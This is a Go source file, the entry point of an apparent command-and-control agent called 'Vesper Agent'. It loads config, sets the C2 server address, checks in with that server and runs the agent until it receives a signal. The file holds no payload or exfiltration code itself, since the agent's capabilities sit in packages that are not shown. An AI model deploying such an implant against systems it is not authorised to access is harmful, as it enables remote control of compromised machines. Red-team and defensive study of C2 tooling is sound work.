package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/ruby570bocadito/vesper/internal/agent"
	"github.com/ruby570bocadito/vesper/pkg/shared/config"
)

func main() {
	configPath := flag.String("config", "config.yaml", "path to configuration file")
	serverAddr := flag.String("server", "", "C2 server address (overrides config)")
	flag.Parse()

	cfg, err := config.Load(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to load config: %v\n", err)
		os.Exit(1)
	}

	if *serverAddr != "" {
		cfg.Agent.C2Server = *serverAddr
	}

	agt, err := agent.New(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Vesper Agent %s (os=%s arch=%s)\n", agt.ID(), os.Getenv("GOOS"), os.Getenv("GOARCH"))
	fmt.Printf("[+] Public key: %s\n", agt.PublicKey())

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		fmt.Println("\n[!] Shutting down agent...")
		agt.Stop()
		cancel()
	}()

	server := fmt.Sprintf("%s:%d", cfg.Agent.C2Server, cfg.Agent.C2Port)
	if err := agt.CheckIn(ctx, server); err != nil {
		fmt.Fprintf(os.Stderr, "check-in failed: %v\n", err)
		os.Exit(1)
	}

	if err := agt.Run(ctx); err != nil && err != context.Canceled {
		fmt.Fprintf(os.Stderr, "agent error: %v\n", err)
		os.Exit(1)
	}
}
